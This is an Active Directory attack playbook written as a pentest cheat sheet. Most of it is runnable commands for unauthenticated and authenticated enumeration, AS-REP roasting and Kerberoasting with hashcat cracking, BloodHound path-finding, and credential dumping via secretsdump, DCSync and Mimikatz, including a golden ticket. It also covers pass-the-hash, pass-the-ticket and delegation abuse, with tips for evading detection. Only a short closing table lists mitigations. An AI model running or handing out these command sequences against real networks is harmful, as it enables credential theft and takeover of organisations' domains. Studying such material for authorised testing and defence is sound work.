# Active Directory Enumeration Playbook

> AD is the crown jewel of Windows environments. Successful enumeration reveals domain trust relationships, privilege paths, Kerberoastable accounts, AS-REP roastable users, and lateral movement opportunities.

---

## 1. Unauthenticated Enumeration

### 1.1 LDAP Anonymous Bind
```bash
# Check if LDAP allows anonymous bind
ldapsearch -x -H ldap://<dc_ip> -b "" -s base namingContexts   # get base DN
ldapsearch -x -H ldap://<dc_ip> -b "DC=corp,DC=local"          # dump all (if anon allowed)

# Specific queries
ldapsearch -x -H ldap://<dc_ip> -b "DC=corp,DC=local" "(objectClass=person)" sAMAccountName
ldapsearch -x -H ldap://<dc_ip> -b "DC=corp,DC=local" "(objectClass=computer)" name
ldapsearch -x -H ldap://<dc_ip> -b "DC=corp,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)"
```

### 1.2 Kerberos User Enumeration (No Creds)
```bash
# kerbrute — enumerate valid usernames via Kerberos pre-auth error difference
kerbrute userenum -d corp.local --dc <dc_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum -d corp.local --dc <dc_ip> users.txt -t 100 -o valid_users.txt

# nmap krb5-enum-users
nmap -p 88 --script krb5-enum-users \
	--script-args krb5-enum-users.realm='corp.local',userdb=/tmp/users.txt <dc_ip>
```

### 1.3 AS-REP Roasting (No Credentials Required)
```bash
# impacket — GetNPUsers.py (accounts with DoNotRequirePreAuth)
impacket-GetNPUsers corp.local/ -dc-ip <dc_ip> -usersfile valid_users.txt -no-pass
impacket-GetNPUsers corp.local/user:password -dc-ip <dc_ip> -request -outputfile asrep.hashes

# Crack the hash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
john asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

**Finding:** Accounts with "Do Not Require Kerberos Pre-Authentication" → AS-REP hash offline crackable.

---

## 2. Authenticated Enumeration — LDAP

```bash
# All users
ldapsearch -x -H ldap://<dc_ip> -D "user@corp.local" -w 'password' \
	-b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName memberOf

# All computers
ldapsearch -x -H ldap://<dc_ip> -D "user@corp.local" -w 'password' \
	-b "DC=corp,DC=local" "(objectClass=computer)" name operatingSystem

# Kerberoastable users (have SPN set)
ldapsearch -x -H ldap://<dc_ip> -D "user@corp.local" -w 'password' \
	-b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Domain Admins members
ldapsearch -x -H ldap://<dc_ip> -D "user@corp.local" -w 'password' \
	-b "CN=Domain Admins,CN=Users,DC=corp,DC=local" member

# Password policy
ldapsearch -x -H ldap://<dc_ip> -D "user@corp.local" -w 'password' \
	-b "DC=corp,DC=local" "(objectClass=domain)" minPwdLength lockoutThreshold
```

---

## 3. PowerView — Comprehensive AD Enumeration (Windows)

```powershell
# Load PowerView
Import-Module PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainTrust             # trust relationships
Get-ForestTrust             # forest trusts

# Users
Get-DomainUser
Get-DomainUser -Identity jsmith -Properties *
Get-DomainUser -SPN                                    # Kerberoastable users
Get-DomainUser -PreauthNotRequired                     # AS-REP roastable
Get-DomainUser -Properties sAMAccountName,LastLogon,badPwdCount,PasswordLastSet

# Groups
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroup -AdminCount                            # all protected/admin groups

# Computers
Get-DomainComputer -Properties Name,OperatingSystem,LastLogonDate
Get-DomainComputer -Unconstrained                      # unconstrained delegation — high value
Get-DomainComputer -TrustedToAuth                      # constrained delegation hosts

# ACLs — find abusable rights
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity jsmith -ResolveGUIDs | Where ActiveDirectoryRights -Match "GenericAll|WriteDacl|WriteOwner"

# Sessions & local admin access
Find-LocalAdminAccess                                  # all machines where current user is local admin
Find-DomainUserLocation -UserName "jsmith"             # where is user logged in?

# Kerberoasting
Invoke-Kerberoast -OutputFormat Hashcat
```

---

## 4. BloodHound / SharpHound — Attack Path Analysis

```bash
# SharpHound — collect all data (run on Windows in domain)
SharpHound.exe -c All
SharpHound.exe -c All,GPOLocalGroup
SharpHound.exe -c DCOnly                               # stealthy DC-only
SharpHound.exe --Loop --LoopDuration 02:00:00          # loop for session data

# Python BloodHound (from Linux — no Windows required)
pip3 install bloodhound
bloodhound-python -u user -p pass -d corp.local -dc dc01.corp.local -c All -ns <dc_ip>
bloodhound-python -u user -p pass -d corp.local -dc dc01.corp.local -c All --zip

# Import to BloodHound GUI → start neo4j → start bloodhound → drag-and-drop zip
```

**BloodHound Cypher queries:**
```cypher
// Shortest path to Domain Admins
MATCH (n:User {name:"JSMITH@CORP.LOCAL"}),(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
p=shortestPath((n)-[*1..]->(m)) RETURN p

// All Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

// Unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS 'DC' RETURN c

// DCSync rights
MATCH (n)-[r:GetChanges|GetChangesAll|GetChangesInFilteredSet]->(m:Domain) RETURN n,r,m
```

---

## 5. Kerberoasting

```bash
# impacket (Linux)
impacket-GetUserSPNs corp.local/user:password -dc-ip <dc_ip> -request
impacket-GetUserSPNs corp.local/user:password -dc-ip <dc_ip> -outputfile kerberoast.hashes

# Crack
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt \
	--rules-file /usr/share/hashcat/rules/best64.rule

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerberoast.hashes /format:hashcat
Rubeus.exe kerberoast /rc4opsec /nowrap    # RC4 only, avoid AES detection
```

---

## 6. Credential Dumping

```bash
# secretsdump — remote SAM + LSA dump (requires local admin)
impacket-secretsdump corp.local/admin:password@<target>

# DCSync — dump NTDS (requires GetChanges + GetChangesAll rights on domain)
impacket-secretsdump corp.local/da_user:password@<dc_ip> -just-dc
impacket-secretsdump corp.local/da_user:password@<dc_ip> -just-dc-user krbtgt

# Mimikatz (Windows)
# sekurlsa::logonpasswords     → LSASS → cleartext + NTLM
# sekurlsa::tickets            → Kerberos TGT/ST tickets
# lsadump::dcsync /user:krbtgt → DCSync for krbtgt hash
# kerberos::golden /user:admin /domain:corp.local /sid:<sid> /krbtgt:<hash> /ptt  → Golden Ticket
```

---

## 7. Pass-the-Hash / Pass-the-Ticket

```bash
# Pass the hash
impacket-psexec corp.local/admin@<target> -hashes :NTLM_HASH
impacket-wmiexec corp.local/admin@<target> -hashes :NTLM_HASH
crackmapexec smb <target> -u admin -H NTLM_HASH -x "whoami"

# Pass the Ticket
impacket-getTGT corp.local/user:pass -dc-ip <dc_ip>   # save .ccache
export KRB5CCNAME=/tmp/user.ccache
impacket-psexec -k -no-pass corp.local/user@target

# Rubeus
Rubeus.exe ptt /ticket:<base64_ticket>
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
```

---

## 8. Delegation Attacks

```bash
# Unconstrained Delegation — harvest TGTs
Get-DomainComputer -Unconstrained | select name
Rubeus.exe monitor /interval:5 /nowrap
python3 printerbug.py corp.local/user:pass@<dc_ip> <unconstrained_host>   # coerce DC auth

# Constrained Delegation (S4U2Self + S4U2Proxy)
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:Administrator \
	/msdsspn:"cifs/<target>" /ptt

# Resource-Based Constrained Delegation (RBCD)
# If writable msDS-AllowedToActOnBehalfOfOtherIdentity on target computer object:
Set-DomainRawObjectProperty -Identity <target_computer> \
	-PropertyName msDS-AllowedToActOnBehalfOfOtherIdentity -PropertyValue <attacker_sid>
Rubeus.exe s4u /user:<attacker_computer$> /rc4:<hash> /impersonateuser:Administrator \
	/msdsspn:"cifs/<target_computer>" /ptt
```

---

## 9. Findings → Vulnerability Mapping

| Finding | Severity | Notes | Mitigation |
|---------|----------|-------|------------|
| Kerberoastable service account | High | Weak password → cracked → lateral/privesc | Use gMSA; 25+ char random passwords |
| AS-REP roastable user | High | No preauth → offline crack | Require preauth for all accounts |
| DCSync rights on non-DC | Critical | Can dump all domain hashes | Audit and remove replication permissions |
| Unconstrained delegation | High | TGT harvesting | Use constrained/resource-based delegation only |
| Anonymous LDAP bind | High | User/group enum without creds | Disable anonymous LDAP bind |
| GPP passwords in SYSVOL | Critical | Decryptable AES-256 with public key | Apply MS14-025; remove GPP passwords |
| Pass-the-hash viable | High | NTLM reuse across systems | Enable Protected Users; disable NTLM where possible |
